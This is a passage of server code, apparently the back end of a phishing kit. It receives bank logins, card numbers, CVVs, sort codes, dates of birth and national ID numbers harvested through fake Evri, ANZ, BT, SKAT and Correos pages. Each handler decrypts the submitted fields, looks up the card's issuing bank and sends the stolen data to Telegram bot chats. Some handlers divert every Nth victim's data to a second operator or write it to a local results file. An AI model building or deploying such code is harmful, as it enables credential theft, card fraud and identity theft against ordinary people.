  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yardzCount == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        capzEvri = 5;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5138777422&text=Evri:\n${originalText}`
        );
        capzEvri += 1;
      }

      res.send("Update Completed");
    });
});

//ANZ
//ANZ
//ANZ

app.options("/anzAR", cors());

app.post("/anzAR", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=ANZ:\n${originalText}`
  );
  res.send("Update Completed");
});

app.options("/anzHoods", cors());

app.post("/anzHoods", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-665384174&text=ANZ:\n${originalText}`
  );
  res.send("Update Completed");
});

let anzTarrifi = 0;

app.options("/anzTarrifi", cors());

app.post("/anzTarrifi", (req, res) => {
  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (anzTarrifi == 4) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    anzTarrifi = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=ANZTarrifi:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=ANZ:\n${originalText}`
    );
    anzTarrifi += 1;
  }
  res.send("Update Completed");
});

//BT
//BT
//BT

app.options("/@skiii719", cors());

app.post("/@skiii719", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ssfinesse", cors());

app.post("/ssfinesse", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  mmn = CryptoJS.AES.decrypt(req.body.mmn, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ip = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nMMN: ${mmn}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
        );
        skiii719 = 0;
      } else if (bin === "535666" || bankName === "SANTANDER") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BTSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=BT:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

//SKAT
//SKAT
//SKAT

let skat = 0;

app.options("/skatPersonal", cors());

app.post("/skatPersonal", (req, res) => {
  username = req.body.username;
  fullname = req.body.fullname;
  address = req.body.address;
  city = req.body.city;
  zip = req.body.zip;
  dob = req.body.dob;
  telephone = req.body.telephone;
  cpr = req.body.cpr;
  bank = req.body.bank;
  var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;

  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `Skat\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 1449567433,
        text: `Skat\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });

  var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n\n`;

  fs.appendFile("results.txt", resultsTxt, (err) => {
    if (err) {
      console.log(err);
    }
  });

  res.send("Update Completed");
});

app.options("/skatBilling", cors());

app.post("/skatBilling", (req, res) => {
  ccname = req.body.ccname;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  zip = req.body.zip;
  dob = req.body.dob;
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Skat\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1449567433,
            text: `Skat\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

      fs.appendFile("results.txt", resultsTxt, (err) => {
        if (err) {
          console.log(err);
        }
      });

      res.send("Update Completed");
    })
    .catch((e) => {
      console.log(e);
    });
});

//CORREOS
//CORREOS
//CORREOS

app.options("/correos", cors());

app.post("/correos", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1449567433,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

app.options("/removeips", cors());

app.post("/removeips", (req, res) => {
  ip = req.body.ip;

  content = ``;
  fs.writeFile("ips.txt", content, (err) => {
    if (err) {
      console.error(err);
    } else {
      res.send("Update Completed");
    }
  });
});

app.listen(port, () => console.log(`Started server at port ` + port));
